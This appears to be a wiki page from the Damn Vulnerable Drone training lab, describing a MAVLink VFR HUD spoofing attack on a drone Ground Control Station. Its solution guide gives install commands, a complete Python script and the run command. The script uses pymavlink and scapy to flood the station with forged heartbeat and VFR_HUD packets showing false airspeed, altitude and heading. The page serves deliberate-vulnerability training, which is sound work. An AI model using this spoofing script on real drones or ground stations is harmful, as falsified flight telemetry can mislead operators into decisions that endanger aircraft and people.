<i>Spoofing the VFR HUD (Vertical Flight Reference Heads-Up Display) data to mislead the Ground Control Station (GCS) about the drone's flight status.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Protocol Tampering > VFR HUD Spoofing

# Description

VFR HUD spoofing involves sending false VFR HUD data (airspeed, ground speed, altitude, climb rate, heading, and throttle) to the Ground Control Station (GCS) to mislead it about the drone's actual flight status. This can cause the operator to make incorrect decisions based on the spoofed data.

# Resources

- <a href="https://mavlink.io/en/">MAVLink Protocol</a>  
- <a href="https://mavlink.io/en/mavgen_python/">PyMAVLink Documentation</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Setup</h3>
<pre><code class="code mb-3 mt-3">sudo apt-get update
sudo apt-get install python3 python3-pip
pip3 install pymavlink scapy
</code></pre>

---

<h3>Step 2. Create the Script</h3>
<p>Save the following code as <code>vfr-hud-spoofing.py</code>:</p>

<pre><code class="code mb-3 mt-3">from pymavlink import mavutil
from scapy.all import *
import time
import sys
import random

def create_heartbeat():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.heartbeat_encode(
        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        custom_mode=3,
        system_status=mavutil.mavlink.MAV_STATE_ACTIVE
    ).pack(mav)

def create_vfr_hud():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1

    airspeed = random.uniform(0, 20)
    groundspeed = random.uniform(0, 20)
    heading = random.randint(0, 360)
    altitude = random.uniform(0, 100)
    climb = random.uniform(-5, 5)

    return mav.vfr_hud_encode(
        airspeed=airspeed,
        groundspeed=groundspeed,
        heading=heading,
        throttle=0,
        alt=altitude,
        climb=climb
    ).pack(mav)

def send_mavlink_packet(packet_data, target_ip, target_port):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    send(packet)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python vfr-hud-spoofing.py &lt;ip:port&gt;")
        sys.exit(1)

    target_ip, target_port = sys.argv[1].split(':')
    target_port = int(target_port)

    while True:
        send_mavlink_packet(create_heartbeat(), target_ip, target_port)
        send_mavlink_packet(create_vfr_hud(), target_ip, target_port)
        print(f"Sent heartbeat and VFR_HUD packets to {target_ip}:{target_port}")
</code></pre>

---

<h3>Step 3. Run the Script</h3>
<pre><code class="code mb-3 mt-3">sudo python3 vfr-hud-spoofing.py 10.13.0.6:14550</code></pre>

<p>You may also use:</p>
<ul>
  <li><code>192.168.13.14:14550</code> — MAVProxy over WiFi</li>
  <li><code>10.13.0.4:14550</code> — MAVProxy over Docker bridge</li>
</ul>

---

<h3>Step 4. Monitor the Effects</h3>
<p>Observe the Ground Control Station. Spoofed values such as airspeed, altitude, and heading will appear incorrect, potentially leading to bad operator judgment or automated flight logic errors.</p>

</details>
